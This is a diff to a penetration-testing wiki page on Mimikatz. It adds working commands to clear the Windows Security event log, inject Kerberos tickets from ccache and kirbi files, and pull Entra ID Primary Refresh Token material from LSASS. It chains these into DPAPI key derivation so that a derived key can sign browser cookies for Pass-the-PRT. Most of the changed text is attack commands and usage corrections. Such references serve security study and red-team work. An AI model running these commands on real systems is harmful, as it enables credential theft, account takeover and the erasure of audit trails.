@@ -42,8 +42,11 @@ Event log tampering in Mimikatz involves two primary actions: clearing event log
 
 #### Clearing Event Logs
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+Mimikatz does provide `event::clear`. It calls the Windows event-log clearing API for the selected classic log. The default is `Security`; `/log:` selects another log, and the caller needs rights to clear it. This is not the same as `event::drop`, which tries to stop new records from being written.<sup>[[4]](#references)</sup>
+
+```bash
+mimikatz "event::clear /log:Security" exit
+```
 
 #### Experimental Feature: Patching the Event Service
 
@@ -114,17 +117,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
   - Command: `kerberos::list`
   - Lists all Kerberos tickets for the current user session.
 
-- **Pass the Cache**:
+- **Pass the Cache**: `kerberos::ptc` reads a MIT/Heimdal `.ccache` file, **not** a `.kirbi` file. Give the file path as a positional argument: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
-
-- **Pass the Ticket**:
-
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **Pass the Ticket**: `kerberos::ptt` reads a `.kirbi` file or a directory of such files. It also takes a positional path, not `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. See [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) for the broader workflow.<sup>[[6]](#references)</sup>
 
 - **Purge Tickets**:
   - Command: `kerberos::purge`
@@ -179,15 +174,16 @@ mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /
 
 ### Cloud credentials / Entra ID
 
-On **Entra ID** or **hybrid-joined** hosts, `sekurlsa::cloudap` can expose cached **Primary Refresh Token (PRT)** material from LSASS. If the associated Proof-of-Possession key is software-protected, `dpapi::cloudapkd` can derive the clear/derived key material needed for follow-on **Pass-the-PRT** workflows.<sup>[[1]](#references)</sup>
+On **Entra ID** or **hybrid-joined** hosts, `sekurlsa::cloudap` can expose cached **Primary Refresh Token (PRT)** material from LSASS. Its `ProofOfPossesionKey.KeyValue` is the DPAPI-protected session-key blob, not the already decrypted key.<sup>[[7]](#references)[[8]](#references)</sup> To use `/unprotect`, run `dpapi::cloudapkd` as `SYSTEM` (for example, `token::elevate` from an elevated Mimikatz session), or first populate Mimikatz's key cache with `sekurlsa::dpapi`. `privilege::debug` alone does not switch the DPAPI caller context.<sup>[[8]](#references)</sup>
 
 ```bash
-mimikatz "privilege::debug" "sekurlsa::cloudap" exit
-mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
+mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
 mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
 ```
 
-This becomes much harder when the key is TPM-backed, but it is worth checking on hybrid endpoints because the cached CloudAP data may be more interesting than classic `wdigest` output.<sup>[[2]](#references)</sup> For the cloud-side abuse chain, see [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
+Copy the **matching** `Context` and `Derived Key` from the first command into the second; Mimikatz generates a new context when none is supplied. Even for a TPM-protected key, Mimikatz may derive a signing key by using the TPM on the original device. The clear key need not be exported, but a successful derived-key result can sign a browser cookie.<sup>[[7]](#references)</sup>
+
+A PRT string alone is not sufficient because Microsoft Entra requires proof of possession of the associated session key.<sup>[[9]](#references)</sup> See [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) for other master-key options and [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) for the cloud-side chain.
 
 ### Miscellaneous
 
@@ -237,10 +233,17 @@ This becomes much harder when the key is TPM-backed, but it is worth checking on
   - `mimikatz "vault::cred /patch" exit`
 
 
+
+
 ## References
 
 - [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
 - [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
 - [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
-
+- [4] [Mimikatz event module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
+- [5] [Mimikatz ccache module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
+- [6] [Mimikatz Kerberos module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
+- [7] [Mimikatz CloudAP DPAPI implementation](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
+- [8] [Digging further into the Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
+- [9] [Microsoft Entra Primary Refresh Token protection](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
 {{#include ../../banners/hacktricks-training.md}}
